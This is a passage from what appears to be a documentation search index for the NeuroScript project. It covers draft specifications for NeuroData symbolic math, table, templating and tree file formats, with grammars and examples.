References the current file.</li> <li><code>[ref:config/production.yaml]</code> - References the file <code>production.yaml</code> in the <code>config</code> subdirectory.</li> <li><code>[ref:../LICENSE]</code> - References the <code>LICENSE</code> file in the parent directory.</li> </ul> </li> <li>Block References:<ul> <li><code>[ref:this#data-validation-rules]</code> - References block <code>:: id: data-validation-rules</code> in the current file.</li> <li><code>[ref:schemas/user.ndtable#unique-email-rule]</code> - References block <code>:: id: unique-email-rule</code> in the specified table file.</li> <li><code>[ref:../docs/api.md#get-user-example]</code> - References block <code>:: id: get-user-example</code> in a relative documentation file.</li> </ul> </li> </ul>"},{"location":"NeuroData/symbolic_math/","title":"Symbolic Math","text":"<p>:: type: NSproject :: subtype: spec :: version: 0.1.3 :: status: draft :: dependsOn: docs/metadata.md, docs/references.md, docs/neurodata_and_composite_file_spec.md, docs/NeuroData/map_literal.md, docs/NeuroData/map_schema.md :: howToUpdate: Refine function naming conventions, EBNF, specify supported functions/operators, detail tool behaviors and CAS integration strategy. Update attached block example if map_literal or map_schema specs change.</p>"},{"location":"NeuroData/symbolic_math/#neurodata-symbolic-math-format-ndmath-specification","title":"NeuroData Symbolic Math Format (.ndmath) Specification","text":""},{"location":"NeuroData/symbolic_math/#1-purpose","title":"1. Purpose","text":"<p>NeuroData Symbolic Math (<code>.ndmath</code>) provides a format for representing mathematical expressions in a structured, unambiguous way suitable for symbolic manipulation by computer algebra systems (CAS) integrated via NeuroScript tools. It prioritizes structural clarity for machine processing over visual similarity to traditional mathematical notation.</p>"},{"location":"NeuroData/symbolic_math/#2-example-ndmath-with-attached-definitions-and-schema-reference","title":"2. Example <code>.ndmath</code> with Attached Definitions and Schema Reference","text":"<p><pre><code>:: type: SymbolicMath\n:: version: 0.1.2 # Version of this specific ndmath block content\n:: notation: Functional\n:: id: gr-field-eq-annotated\n:: description: Conceptual GR Field Equations with term descriptions.\n\n# The schema for the ns-map-literal block below is defined in Section 5.2\n\n```funcmath\nEquals(\n  Add(\n    Subtract(\n      RicciTensor(mu, nu),\n      Multiply(\n        Divide(1, 2),\n        ScalarCurvature(),\n        MetricTensor(mu, nu)\n      )\n    ),\n    Multiply(\n      Lambda(),\n      MetricTensor(mu, nu)\n    )\n  ),\n  Multiply(\n    Divide(\n      Multiply(8, Pi(), G()), # Constants as functions\n      Power(c(), 4)\n    ),\n    StressEnergyTensor(mu, nu)\n  )\n)\n</code></pre> <pre><code># Attached block defining terms used in the expression above.\n# It conforms to the schema defined in Section 5.2\n:: type: MapLiteralData\n:: version: 1.0.0\n:: schema: [ref:this#math-term-def-schema] # Reference the schema block defined in Sec 5.2\n{\n  \"RicciTensor\": {\n    \"description\": \"Tensor representing curvature derived from the Riemann tensor.\",\n    \"reference\": \"https://en.wikipedia.org/wiki/Ricci_curvature\"\n  },\n  \"MetricTensor\": {\n    \"description\": \"Fundamental tensor defining spacetime geometry (g_\u00b5\u03bd).\",\n    \"reference\": \"[ref:./tensors.md#metric]\" # Link to another project file/block\n  },\n  \"Lambda\": {\n    \"description\": \"Cosmological Constant.\"\n    # No reference needed/provided here, which is allowed by the schema\n  },\n  \"mu\": {\n    \"description\": \"Spacetime index (typically 0-3)\",\n    \"reference\": \"[ref:./glossary.md#indices]\"\n  },\n  \"StressEnergyTensor\": {\n    \"description\": \"Tensor describing density/flux of energy/momentum (T_\u00b5\u03bd).\"\n    # Missing reference (optional)\n  }\n  # ... definitions for nu, ScalarCurvature, Pi, G, c, Equals, Add, etc.\n}\n</code></pre> <pre><code>## 3. Design Choices\n\n* **Functional Notation:** Chosen over S-expressions for improved readability for users familiar with programming language function calls. Chosen over presentational formats (like LaTeX or MathML Presentation) because the primary goal is representing the mathematical structure for computation, not visual layout. Chosen over semantic formats like Content MathML for relative simplicity in syntax and parsing, assuming a dedicated NeuroScript parser.\n* **Pure Functional Form:** Operators (like `+`, `*`, `^`) are represented as functions (`Add`, `Multiply`, `Power`) to ensure an unambiguous tree structure suitable for parsing.\n* **Term Definitions:** Descriptions, links, or other metadata about symbols or functions used within the expression can be provided in an attached `ns-map-literal` block [[map_literal.md](./NeuroData/map_literal.md)], conforming to the schema defined in Section 5.2.\n* **Tool-Centric:** The format relies heavily on NeuroScript tools (`TOOL.Math*`) to perform actual symbolic manipulation (simplification, differentiation, etc.) and conversion to/from other formats (LaTeX, S-expressions, Infix). These tools would typically wrap external CAS libraries.\n\n## 4. Syntax (`.ndmath`)\n\nAn `.ndmath` file or block consists of:\n1.  **File-Level Metadata:** Optional `:: key: value` lines [[metadata.md](./metadata.md)].\n2.  **Optional Term Definition Schema Block:** An optional fenced block tagged `ndmap_schema` defining the structure for term definitions. See Section 5.2.\n3.  **Expression Block:** A single fenced block containing the mathematical expression represented in Functional Notation. Tag should be `funcmath` or similar. See Section 5.3.\n4.  **Optional Attached Term Definitions Block:** An optional fenced block tagged `ns-map-literal` containing definitions for terms used in the expression block, conforming to the defined schema. See Section 5.4.\n\n### 4.1 File-Level Metadata\n\nStandard `:: key: value` lines. Recommended metadata includes:\n* `:: type: SymbolicMath` (Required)\n* `:: version: &lt;semver&gt;` (Required, version of the .ndmath content itself)\n* `:: notation: Functional` (Required)\n* `:: id: &lt;unique_expr_id&gt;` (Optional if referenced)\n* `:: description: &lt;text&gt;` (Optional)\n\n## 5. Detailed Syntax Components\n\n### 5.1 Overview\n(Section added to group detailed syntax elements previously under top-level Syntax)\n\n### 5.2 Term Definition Schema Block (`ndmap_schema`)\n\n* An optional block defining the structure of the term definitions map. Its syntax follows the `.ndmap_schema` format [[map_schema.md](./NeuroData/map_schema.md)].\n* It's recommended to include this if using an attached term definitions block (Section 5.4).\n* **Example Schema Definition:**\n```ndmap_schema\n# Embedded schema defining the structure for the value associated with each term key\n# in the attached ns-map-literal block (e.g., the value for \"RicciTensor\", \"mu\").\n\n:: type: NSMapSchema\n:: version: 0.1.0\n:: id: math-term-def-schema # ID for referencing within this file\n:: description: Defines the structure expected for the definition map of a single term (symbol or function) used in .ndmath expressions.\n\nKEY \"description\" # Key name must be literal string in schema\n  DESC \"A human-readable explanation of the term.\"\n  TYPE string\n  REQUIRED true # Description is required for clarity\n\nKEY \"reference\"\n  DESC \"A URL or [ref:...] link to more detailed documentation or definition.\"\n  TYPE string   # Type is string; content validation (URL/ref format) is separate\n  REQUIRED false # Reference is optional\n</code></pre></p>"},{"location":"NeuroData/symbolic_math/#53-expression-block-functional-notation","title":"5.3 Expression Block (Functional Notation)","text":"<ul> <li>The main mathematical expression is stored within a fenced block, typically with language tag <code>funcmath</code>.</li> <li>Syntax: Expressions are represented using a prefix functional notation: <code>FunctionName(arg1, arg2, ...)</code><ul> <li><code>FunctionName</code>: Represents a mathematical function (e.g., <code>Sin</code>, <code>Log</code>), operator (e.g., <code>Add</code>), or structural element (e.g., <code>Equals</code>, <code>Integrate</code>).</li> <li><code>arg1, arg2, ...</code>: Arguments (Literals, Symbols, Nested Calls).</li> </ul> </li> <li>Mapping Examples:<ul> <li><code>x + y</code> -&gt; <code>Add(x, y)</code></li> <li><code>2 * x</code> -&gt; <code>Multiply(2, x)</code></li> <li><code>x^2</code> -&gt; <code>Power(x, 2)</code></li> <li><code>sin(x)</code> -&gt; <code>Sin(x)</code></li> <li><code>df/dx</code> -&gt; <code>Differentiate(f, x)</code></li> <li><code>integrate(f(x), x)</code> -&gt; <code>Integrate(f(x), x)</code> (Indefinite)</li> <li><code>integrate(f(x), x, 0, 1)</code> -&gt; <code>Integrate(f(x), List(x, 0, 1))</code> (Definite)</li> </ul> </li> </ul>"},{"location":"NeuroData/symbolic_math/#54-attached-term-definitions-block-ns-map-literal","title":"5.4 Attached Term Definitions Block (<code>ns-map-literal</code>)","text":"<ul> <li>Optionally, immediately following the <code>funcmath</code> block, an attached block tagged <code>ns-map-literal</code> can be used.</li> <li>The content must be a single, valid NeuroScript map literal [script spec.md], conforming to the schema defined (usually in Section 5.2 or referenced via <code>:: schema:</code> metadata within this block, see [map_literal.md])</li> <li>Keys are term names (strings), values are maps usually containing <code>description</code> (string, required by schema in Sec 5.2) and <code>reference</code> (string, optional).</li> <li>Tools should parse this block using a NeuroScript parser and link definitions to terms in the main expression.</li> <li>See the example in Section 2.</li> </ul>"},{"location":"NeuroData/symbolic_math/#6-ebnf-grammar-draft-needs-update-for-attached-blocks-schema","title":"6. EBNF Grammar (Draft - Needs Update for Attached Blocks &amp; Schema)","text":"<p><pre><code>math_file          ::= { metadata_line | comment_line | blank_line }\n                      [ term_definition_schema_block ]\n                      expression_block\n                      [ term_definition_data_block ] ;\n\nmetadata_line      ::= optional_whitespace \"::\" whitespace key \":\" value newline ;\n\nterm_definition_schema_block ::= optional_whitespace \"```\" \"ndmap_schema\" newline map_schema_content optional_whitespace \"```\" newline ;\nexpression_block   ::= optional_whitespace \"```\" language_tag? newline functional_expression optional_whitespace \"```\" newline ;\nterm_definition_data_block ::= optional_whitespace \"```\" \"ns-map-literal\" newline map_literal_content optional_whitespace \"```\" newline ;\n\nfunctional_expression ::= function_call | symbol | literal ;\n\nfunction_call     ::= identifier \"(\" [ argument_list ] \")\" ;\nargument_list     ::= functional_expression { \",\" functional_expression } ;\n\nsymbol            ::= identifier ;\nliteral           ::= number_literal | string_literal | boolean_literal ;\n\nmap_schema_content ::= (* Content parsed according to .ndmap_schema syntax *) ;\nmap_literal_content ::= (* Content parsed according to NeuroScript map literal syntax *) ;\n\nidentifier        ::= letter { letter | digit | \"_\" } ;\n\n(* Define other terms *)\n</code></pre> (Note: This EBNF needs significant refinement.)</p>"},{"location":"NeuroData/symbolic_math/#7-tooling-requirements","title":"7. Tooling Requirements","text":"<p>Effective use requires CAS-wrapping tools plus parsing capabilities for <code>.ndmap_schema</code> and <code>ns-map-literal</code>.</p> <ul> <li>Core Manipulation Tools: (Remain the same) <code>TOOL.MathSimplify</code>, <code>TOOL.MathExpand</code>, etc.</li> <li>Conversion Tools: (Remain the same) <code>TOOL.MathToLatex</code>, etc.</li> <li>Parsing Requirement: Tools interacting with <code>.ndmath</code> must be capable of:<ul> <li>Optionally parsing an <code>ndmap_schema</code> block (Section 5.2).</li> <li>Parsing the primary <code>funcmath</code> block (Section 5.3).</li> <li>Optionally detecting and parsing a subsequent <code>ns-map-literal</code> block (Section 5.4) using the NeuroScript expression parser.</li> <li>Optionally validating the parsed map literal against the parsed schema (using the schema block's ID if referenced with <code>this#</code>).</li> <li>Optionally using the extracted term definitions for validation, display, or further processing.</li> </ul> </li> </ul>"},{"location":"NeuroData/table/","title":"NeuroData Table Format (.ndtable) Specification","text":"<p>:: type: TableFormatSpec :: version: 0.1.0 :: status: draft :: dependsOn: docs/metadata.md, docs/neurodata_and_composite_file_spec.md, docs/script spec.md, docs/ns/tools/query_table :: howToUpdate: Review schema definitions, validation rules, data format, EBNF, and examples. Update planned features (NS fragments). See also query spec (docs/ns/tools/query_table)</p>"},{"location":"NeuroData/table/#1-purpose","title":"1. Purpose","text":"<p>NeuroData Tables (<code>.ndtable</code>) provide a simple, human-readable plain-text format for representing tabular data, similar to simple SQL tables or CSV files but with an explicitly defined schema and validation rules embedded within the file. This format is intended for storing hundreds or thousands of rows for simple lookup and CRUD (Create, Read, Update, Delete) operations, primarily by tools and AI, while remaining easily inspectable by humans. Joins between tables are not an explicit design goal for this format.</p>"},{"location":"NeuroData/table/#2-syntax","title":"2. Syntax","text":"<p>A <code>.ndtable</code> file consists of the following sections in order: 1.  File-Level Metadata: Optional <code>:: key: value</code> lines [cite: uploaded:neuroscript/docs/metadata.md]. 2.  Schema Definition: Zero or more <code>COLUMN</code> definition lines defining the table structure and constraints. 3.  Data Separator: A line containing exactly <code>--- DATA ---</code> to mark the end of the schema and the beginning of data rows. 4.  Data Rows: Zero or more lines representing the table data, with columns delimited by a specific character (pipe <code>|</code>).</p> <p>Comments (<code>#</code> or <code>--</code>) and blank lines can appear before the Schema Definition and between <code>COLUMN</code> lines. They are generally ignored within the Data Rows section, unless a specific tool interprets commented-out data rows.</p>"},{"location":"NeuroData/table/#21-file-level-metadata","title":"2.1 File-Level Metadata","text":"<p>Standard <code>:: key: value</code> lines [cite: uploaded:neuroscript/docs/metadata.md]. Recommended metadata includes: * <code>:: type: Table</code> (Required) * <code>:: version: &lt;semver&gt;</code> (Required) * <code>:: id: &lt;unique_table_id&gt;</code> (Optional) * <code>:: primaryKey: &lt;column_name&gt;</code> (Optional, indicates the primary key column) * <code>:: description: &lt;text&gt;</code> (Optional)</p>"},{"location":"NeuroData/table/#22-schema-definition-section","title":"2.2 Schema Definition Section","text":"<p>This section defines the columns, their types, and validation rules. * Format: <code>COLUMN column_name data_type [validation_rules...]</code> * <code>COLUMN</code>: Keyword. * <code>column_name</code>: Identifier for the column (<code>[a-zA-Z_][a-zA-Z0-9_]*</code>). Must be unique within the table. * <code>data_type</code>: Specifies the expected data type. Supported types:     * <code>string</code>: Text data.     * <code>int</code>: 64-bit signed integer.     * <code>float</code>: 64-bit floating-point number.     * <code>bool</code>: Boolean (<code>true</code> or <code>false</code>).     * <code>timestamp</code>: ISO 8601 format timestamp string (e.g., <code>2024-01-15T10:00:00Z</code>).     * <code>enum(\"value1\", \"value2\", ...)</code>: String restricted to one of the specified quoted values. * <code>[validation_rules...]</code>: Optional space-separated validation keywords and arguments:     * <code>NOT NULL</code>: The column cannot contain an empty value.     * <code>UNIQUE</code>: The value in this column must be unique across all rows in the table.     * <code>REGEX(\"pattern\")</code>: The string value must match the provided Go regular expression pattern.     * <code>MIN(value)</code>: The numeric/timestamp value must be greater than or equal to <code>value</code>.     * <code>MAX(value)</code>: The numeric/timestamp value must be less than or equal to <code>value</code>.     * <code>DEFAULT(value)</code>: Specifies a default value if none is provided on insert. The <code>value</code> should be interpretable as the column's <code>data_type</code> (e.g., <code>DEFAULT(0)</code>, <code>DEFAULT(\"pending\")</code>, <code>DEFAULT(true)</code>). <code>DEFAULT(NOW)</code> is a special value for <code>timestamp</code> columns, indicating the current time on insert/update.</p>"},{"location":"NeuroData/table/#23-neuroscript-fragment-rules-planned-for-future-versions","title":"2.3 NeuroScript Fragment Rules (Planned for Future Versions)","text":"<p>(Note: The following rules using <code>VALIDATE_NS</code> and <code>DEFAULT_NS</code>/<code>GENERATE_NS</code> are planned features and not part of the v0.1.0 specification. They are included here for design context.) * <code>VALIDATE_NS(\"neuroscript_expression\")</code>: (Future) The string value must satisfy the NeuroScript expression, which should evaluate to <code>true</code>. The expression can use <code>{{value}}</code> to refer to the value being validated. Example: <code>VALIDATE_NS(\"{{value}} &gt;= 0 AND {{value}} &lt; 100\")</code>. * <code>DEFAULT_NS(\"neuroscript_expression\")</code>: (Future) Uses the result of the NeuroScript expression as the default value. Example: <code>DEFAULT_NS(\"CALL TOOL.GenerateUUID()\")</code>. * <code>GENERATE_NS(\"neuroscript_expression\")</code>: (Future) The value for this column is always generated by the NeuroScript expression, potentially using other row values via <code>{{row.column}}</code>. Example: <code>GENERATE_NS(\"'{{row.first}}' + ' ' + '{{row.last}}'\")</code>.</p>"},{"location":"NeuroData/table/#24-data-separator","title":"2.4 Data Separator","text":"<p>A single line containing exactly <code>--- DATA ---</code> MUST follow the last Schema Definition line (or metadata if no schema).</p>"},{"location":"NeuroData/table/#25-data-rows-section","title":"2.5 Data Rows Section","text":"<ul> <li>Each line represents one row in the table.</li> <li>Columns are separated by the pipe character (<code>|</code>). Leading/trailing whitespace around the pipe delimiter AND within a cell is significant unless tools specifically trim it.</li> <li>The number of delimiters should correspond to the number of columns defined in the schema (i.e., <code>num_columns - 1</code> pipe characters).</li> <li>Escaping:<ul> <li>To include a literal pipe character (<code>|</code>) within a cell's data, it should be escaped as <code>\\|</code>.</li> <li>To include a literal backslash (<code>\\</code>) within a cell's data, it should be escaped as <code>\\\\</code>.</li> <li>Newlines within cell data are generally discouraged for simplicity. If needed, they could be represented by <code>\\n</code> (literal backslash-n), requiring tools to interpret this sequence during read/write. Representing actual multi-line text is better handled using attached data blocks or separate notes fields.</li> </ul> </li> <li>Null/Empty vs. Default: An empty string between delimiters (e.g., <code>value1||value3</code>) represents an empty/null value for the second column. If a <code>DEFAULT</code> rule exists for that column, tools should apply it during insertion if the value is empty.</li> </ul>"},{"location":"NeuroData/table/#3-ebnf-grammar-draft","title":"3. EBNF Grammar (Draft)","text":"<pre><code>table_file        ::= { metadata_line | comment_line | blank_line }\n                    schema_section\n                    data_separator newline\n                    data_section ;\n\nmetadata_line     ::= optional_whitespace \"::\" whitespace key \":\" value newline ; (* As per graph spec *)\nschema_section      ::= { column_definition | comment_line | blank_line } ;\ncolumn_definition ::= optional_whitespace \"COLUMN\" whitespace column_name whitespace data_type { whitespace validation_rule } newline ;\ncolumn_name       ::= identifier ;\ndata_type         ::= \"string\" | \"int\" | \"float\" | \"bool\" | \"timestamp\" | enum_definition ;\nenum_definition    ::= \"enum(\" quoted_string { \",\" quoted_string } \")\" ;\nvalidation_rule   ::= \"NOT\" whitespace \"NULL\" | \"UNIQUE\" | regex_rule | minmax_rule | default_rule | ns_validation_rule ; (* ns_* are future *)\nregex_rule        ::= \"REGEX(\" quoted_string \")\" ;\nminmax_rule       ::= (\"MIN\" | \"MAX\") \"(\" simple_value \")\" ;\ndefault_rule      ::= \"DEFAULT(\" (simple_value | \"NOW\") \")\" ;\nns_validation_rule::= \"VALIDATE_NS(\" quoted_string \")\" ; (* Future *)\n\ndata_separator    ::= optional_whitespace \"--- DATA ---\" optional_whitespace ;\n\ndata_section      ::= { data_row } ;\ndata_row          ::= cell_value { optional_whitespace \"|\" optional_whitespace cell_value } newline ;\ncell_value        ::= { character_except_pipe_or_newline | escaped_pipe | escaped_backslash | escaped_newline } ; (* Needs refinement *)\n\n(* Define: identifier, key, value, rest_of_line, quoted_string, simple_value, number_literal, boolean_literal, whitespace, newline, comment_line, blank_line, escaped_pipe, escaped_backslash, escaped_newline *)\n</code></pre>"},{"location":"NeuroData/table/#4-tool-interaction-crud","title":"4. Tool Interaction (CRUD)","text":"<p>Tools interacting with <code>.ndtable</code> files (e.g., <code>TOOL.ReadTable</code>, <code>TOOL.InsertRow</code>, <code>TOOL.UpdateRow</code>, <code>TOOL.DeleteRow</code>) should: 1.  Parse the schema section first. 2.  Validate data during <code>InsertRow</code> and <code>UpdateRow</code> operations against the defined <code>data_type</code> and <code>validation_rules</code>. 3.  Apply <code>DEFAULT</code> values during <code>InsertRow</code> if a column value is missing or empty. 4.  Enforce <code>UNIQUE</code> constraints. 5.  Handle escaping/unescaping of <code>|</code>, <code>\\</code>, and potentially <code>\\n</code> when reading/writing data rows. 6.  (Future) Execute <code>VALIDATE_NS</code> fragments during validation and <code>DEFAULT_NS</code>/<code>GENERATE_NS</code> during row creation/modification.</p>"},{"location":"NeuroData/table/#5-example","title":"5. Example","text":"<pre><code>:: type: Table\n:: version: 0.1.0\n:: primaryKey: user_id\n:: description: Example user table.\n\n# Schema\nCOLUMN user_id  int     NOT NULL UNIQUE MIN(1)\nCOLUMN name     string  NOT NULL REGEX(\"^[A-Za-z ]+$\")\nCOLUMN email    string  UNIQUE\nCOLUMN status   enum(\"active\", \"inactive\", \"pending\") DEFAULT(\"pending\")\nCOLUMN created  timestamp DEFAULT(NOW)\n# COLUMN score    int     DEFAULT(0) VALIDATE_NS(\"{{value}} &gt;= 0\") # Future Example\n\n--- DATA ---\n1 | Alice | alice@example.com | active | 2024-01-15T10:00:00Z\n2 | Bob   | bob@example.com   |        | 2024-01-16T11:30:00Z\n3 | Charlie | charlie@test.com | active | 2024-02-01T09:00:00Z\n4 | David | david@domain.org | pending | 2024-03-10T15:45:10Z\n5 | Eve   | eve@domain.org    | inactive| 2024-03-11T16:00:00Z\n</code></pre>"},{"location":"NeuroData/templates/","title":"NeuroScript Templating Specification","text":"<p>:: type: Specification :: version: 0.1.0 :: status: draft :: dependsOn: docs/script spec.md, docs/metadata.md, docs/references.md :: howToUpdate: Refine syntax details, restricted eval scope/allowlist, escaping rules, examples.</p>"},{"location":"NeuroData/templates/#1-purpose","title":"1. Purpose","text":"<p>NeuroScript Templating provides a mechanism for generating text-based output (e.g., configuration files, code, reports, messages) by combining a template with structured data. It aims for a balance between simplicity, readability, necessary logic (conditionals, loops), and safety.</p>"},{"location":"NeuroData/templates/#metadata","title":"Metadata","text":"<ol> <li>Type should be template (<code>:: type: template</code>)</li> <li>**Grammar should be hbars (<code>:: grammar: hbars</code>)</li> <li>Target Grammar Metadata (<code>:: templateFor:</code>): Included to provide explicit context about the template's intended output format. This enables tools to perform format-specific validation or apply context-aware escaping (e.g., HTML escaping).</li> </ol>"},{"location":"NeuroData/templates/#2-design-choices-rationale","title":"2. Design Choices &amp; Rationale","text":"<p>The chosen approach is based on Handlebars syntax, incorporating specific NeuroScript integrations: * Handlebars-like Syntax: Selected over Go's <code>text/template</code> for better readability and language neutrality, aligning with NeuroScript's goals. Preferred over strict Mustache to allow essential control flow (<code>if</code>, <code>each</code>) directly within templates. * Restricted <code>eval</code>: Acknowledges the need for simple dynamic computations within templates (beyond basic variable substitution) but prioritizes safety. Direct NeuroScript execution within templates is disallowed; instead, an <code>{{eval \"...\"}}</code> helper provides access to a sandboxed NeuroScript expression evaluator with a very limited function/tool allowlist and access only to template data. * Tool-Based Implementation: Templating is exposed via a NeuroScript tool (<code>TOOL.RenderTemplate</code>) rather than adding new syntax to the core NeuroScript language, keeping the language itself simpler.</p>"},{"location":"NeuroData/templates/#3-template-syntax-handlebars-based","title":"3. Template Syntax (Handlebars-based)","text":"<p>Templates use syntax familiar from Handlebars:</p> <ul> <li>Variable Substitution: <code>{{ variableName }}</code> or <code>{{ data.path.to.variable }}</code>. The renderer will look up <code>variableName</code> in the provided data map. Dot notation accesses nested map values or fields.</li> <li>HTML Escaping: By default, the output of <code>{{ variableName }}</code> should be escaped appropriate to the <code>:: templateFor:</code> context (e.g., HTML escaped if <code>templateFor: html</code>). Use triple braces <code>{{{ variableName }}}</code> to output raw, unescaped content (use with caution!).</li> <li>Conditionals (<code>if</code>): <pre><code>{{#if conditionVariable}}\n  Output when conditionVariable is truthy.\n{{else}}\n  Optional output when conditionVariable is falsey.\n{{/if}}\n</code></pre> (Truthy/falsey follows NeuroScript rules: <code>false</code>, <code>0</code>, <code>\"\"</code>, <code>nil</code>, empty lists/maps are falsey; others are truthy).</li> <li>Iteration (<code>each</code>): <pre><code>{{#each listVariable}}\n  Item: {{this}} Index: {{@index}}\n{{/each}}\n\n{{#each mapVariable}}\n  Key: {{@key}} Value: {{this}}\n{{/each}}\n</code></pre><ul> <li>Iterates over lists or map keys. <code>{{this}}</code> refers to the current item/value. <code>{{@index}}</code> and <code>{{@key}}</code> provide context.</li> </ul> </li> <li>Comments: <code>{{! This is a template comment and will not appear in output }}</code> or <code>{{!-- Another comment style --}}</code></li> </ul>"},{"location":"NeuroData/templates/#31-restricted-expression-evaluation-eval","title":"3.1 Restricted Expression Evaluation (<code>eval</code>)","text":"<ul> <li>Syntax: <code>{{eval \"NeuroScriptExpressionString\"}}</code></li> <li>Functionality: Evaluates the <code>NeuroScriptExpressionString</code> using the core NeuroScript expression engine [cite: uploaded:neuroscript/pkg/core/evaluation_main.go].</li> <li>Restrictions:<ul> <li>Scope: The expression can ONLY access data passed into the template, likely via a predefined namespace (e.g., <code>data</code>). Example: <code>{{eval \"data.price * 1.1\"}}</code>. It CANNOT access main NeuroScript variables or <code>LAST</code>.</li> <li>Allowlist: The expression evaluator runs with a highly restricted allowlist of built-in functions and operators. Only pure, safe operations (e.g., arithmetic <code>+ - * / % **</code>, string concatenation <code>+</code>, comparisons <code>== &gt; &lt;</code>, basic math functions like <code>LN</code>, safe string tools like <code>TOOL.StringLength</code>, <code>TOOL.ToUpper</code> [cite: uploaded:neuroscript/pkg/core/tools_string.go]) are permitted. Crucially, no I/O tools (<code>TOOL.ReadFile</code>, <code>TOOL.WriteFile</code>), no <code>TOOL.ExecuteCommand</code>, no <code>CALL LLM</code>, no <code>TOOL.Git*</code>, etc., are allowed. This prevents templates from having side effects.</li> </ul> </li> <li>Purpose: Intended for simple calculations or formatting logic directly within the template where basic Handlebars helpers are insufficient.</li> </ul>"},{"location":"NeuroData/templates/#4-template-source-and-metadata","title":"4. Template Source and Metadata","text":"<ul> <li>Templates can be provided as:<ul> <li>A literal string.</li> <li>A reference to a file: <code>[ref:path/to/template.hbs]</code></li> <li>A reference to a block: <code>[ref:this#template-block]</code></li> </ul> </li> <li>The source (file or block) MUST include metadata specifying the target output format:<ul> <li><code>:: templateFor: &lt;format_id&gt;</code></li> <li><code>format_id</code> examples: <code>text</code>, <code>markdown</code>, <code>json</code>, <code>yaml</code>, <code>html</code>, <code>xml</code>, <code>neuroscript</code>, <code>go</code>, <code>python</code>, etc.</li> <li>This metadata guides validation and potential automatic escaping by rendering tools.</li> </ul> </li> </ul>"},{"location":"NeuroData/templates/#5-tool-interaction","title":"5. Tool Interaction","text":"<p>Template rendering is performed by a dedicated NeuroScript tool: * <code>TOOL.RenderTemplate(template_ref, data_map)</code>     * <code>template_ref</code> (String or Reference): A string containing the template content OR a <code>[ref:...]</code> string pointing to the template file/block.     * <code>data_map</code> (Map): A NeuroScript map containing the data accessible within the template (e.g., under the <code>data</code> namespace).     * Returns: (String) The rendered output, or an error message string if rendering fails (parsing error, <code>eval</code> error, etc.).</p>"},{"location":"NeuroData/templates/#6-example","title":"6. Example","text":"<p>Template Source (e.g., in a block with <code>:: id: report-tpl</code>): <pre><code>:: templateFor: markdown\n:: version: 1.0\n\n# Report for {{data.user_name}}\n\n{{#if data.is_active}}\nStatus: Active\n{{else}}\nStatus: Inactive\n{{/if}}\n\n## Items ({{eval \"CALL TOOL.StringLength(data.items)\"}} total)\n\n{{#each data.items}}\n* Item {{@index}}: {{this.name}} - Price: ${{eval \"this.price * 1.0\"}} - Tax: ${{eval \"this.price * data.tax_rate\"}}\n{{/each}}\n\nTotal Value (excl. tax): ${{eval \"CalculateTotal(data.items)\"}} {{! Example assuming CalculateTotal is a SAFE allowed function }}\n\nReport generated: {{data.timestamp}}\n</code></pre></p> <p>NeuroScript Usage: <pre><code>SET user_data = {\n  \"user_name\": \"Alice\",\n  \"is_active\": true,\n  \"items\": [\n    {\"name\": \"Thing 1\", \"price\": 10.50},\n    {\"name\": \"Thing 2\", \"price\": 25.00}\n  ],\n  \"tax_rate\": 0.05,\n  \"timestamp\": \"2024-07-26\"\n}\n\n# Assume CalculateTotal is a safe, allowlisted function for eval\n# Or calculate total beforehand and pass it in user_data\n\nCALL TOOL.RenderTemplate(\"[ref:this#report-tpl]\", user_data)\nSET report_output = LAST\n\nEMIT report_output\n</code></pre></p> <p>Expected Output (Conceptual): <pre><code># Report for Alice\n\nStatus: Active\n\n## Items (2 total)\n\n* Item 0: Thing 1 - Price: $10.5 - Tax: $0.525\n* Item 1: Thing 2 - Price: $25 - Tax: $1.25\n\nTotal Value (excl. tax): $35.5\n\nReport generated: 2024-07-26\n</code></pre></p>"},{"location":"NeuroData/tree/","title":"NeuroData Tree Format (.ndtree) Specification","text":"<p>:: type: TreeFormatSpec :: version: 0.1.0 :: status: draft :: grammar: graph :: grammarVer: 0.1.0 :: dependsOn: docs/neurodata/graph.md, docs/metadata.md, docs/neurodata_and_composite_file_spec.md :: howToUpdate: Review tree syntax, property attachment, EBNF, ensure consistency with graph spec.</p>"},{"location":"NeuroData/tree/#1-purpose","title":"1. Purpose","text":"<p>NeuroData Trees (<code>.ndtree</code>) provide a simple, human-readable plain-text format specifically for representing hierarchical tree structures. The format emphasizes readability through indentation while remaining machine-parseable. It is designed primarily to be read by humans and updated by tools or AI.</p>"},{"location":"NeuroData/tree/#2-relation-to-graph-format","title":"2. Relation to Graph Format","text":"<p>The <code>.ndtree</code> format is considered a specialized profile of the <code>.ndgraph</code> format (see <code>:: grammar: graph</code> metadata). It leverages the same node definition (<code>NODE NodeID [Props]</code>) and property syntax but uses indentation to represent the primary parent-child relationships instead of explicit edge markers (<code>-&gt;</code>, <code>&lt;-</code>). Tools parsing <code>.ndtree</code> should infer directed edges from parent to child based on indentation. Cycle detection should be performed by validation tools to ensure tree structure integrity.</p>"},{"location":"NeuroData/tree/#3-syntax","title":"3. Syntax","text":"<p>A <code>.ndtree</code> file consists of: 1.  Optional file-level metadata lines (using <code>:: key: value</code> syntax [cite: uploaded:neuroscript/docs/metadata.md]). 2.  Optional comments (<code>#</code> or <code>--</code>) and blank lines. 3.  A series of <code>NODE</code> definitions, where hierarchical relationships are defined by indentation.</p>"},{"location":"NeuroData/tree/#31-file-level-metadata","title":"3.1 File-Level Metadata","text":"<p>Standard <code>:: key: value</code> lines [cite: uploaded:neuroscript/docs/metadata.md]. Recommended metadata includes: * <code>:: type: Tree</code> (Required) * <code>:: version: &lt;semver&gt;</code> (Required) * <code>:: grammar: graph</code> (Required) * <code>:: grammarVer: &lt;semver&gt;</code> (Required, refers to the graph spec version) * <code>:: id: &lt;unique_tree_id&gt;</code> (Optional but recommended) * <code>:: root: &lt;NodeID&gt;</code> (Optional, explicitly defines the root node) * <code>:: description: &lt;text&gt;</code> (Optional)</p>"},{"location":"NeuroData/tree/#32-node-definition-line","title":"3.2 Node Definition Line","text":"<ul> <li>Format: <code>Indentation NODE NodeID [Optional Properties]</code></li> <li><code>Indentation</code>: Zero or more spaces or tabs. The level of indentation defines the node's parent in the tree (the nearest preceding node line with less indentation). Consistent indentation (e.g., 2 spaces, 4 spaces) is recommended for readability.</li> <li><code>NODE</code>: Keyword indicating a node definition.</li> <li><code>NodeID</code>: A unique identifier for the node within the tree. Must start with a letter or underscore, followed by letters, numbers, or underscores (<code>[a-zA-Z_][a-zA-Z0-9_]*</code>). IDs are case-sensitive.</li> <li><code>[Optional Properties]</code>: An optional block enclosed in square brackets <code>[]</code> containing simple key-value properties for the node (see Section 3.4).</li> 